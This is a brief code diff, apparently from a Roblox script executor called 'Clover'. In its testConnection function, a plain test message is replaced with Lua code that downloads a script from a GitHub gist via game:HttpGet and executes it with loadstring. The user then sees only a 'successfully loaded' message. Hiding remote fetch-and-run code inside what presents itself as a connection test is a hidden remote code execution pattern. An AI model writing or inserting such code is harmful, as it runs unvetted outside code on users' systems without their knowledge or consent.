@@ -112,7 +112,7 @@
       testConnection();
     });
 function testConnection() {
-  const code = 'warn("Clover has loaded!")';
+  const code = 'loadstring(game:HttpGet("https://gist.githubusercontent.com/cloverexecutor/ce888e2639356edaf720b7d06c33dd46/raw/7deac1833990496b135179ffe52d7ec326f55bd1/gistfile1.txt",true))() warn("Clover has successfully loaded")';
   fetch('http://localhost:2025/sigma', {
     method: 'POST',
     headers: {
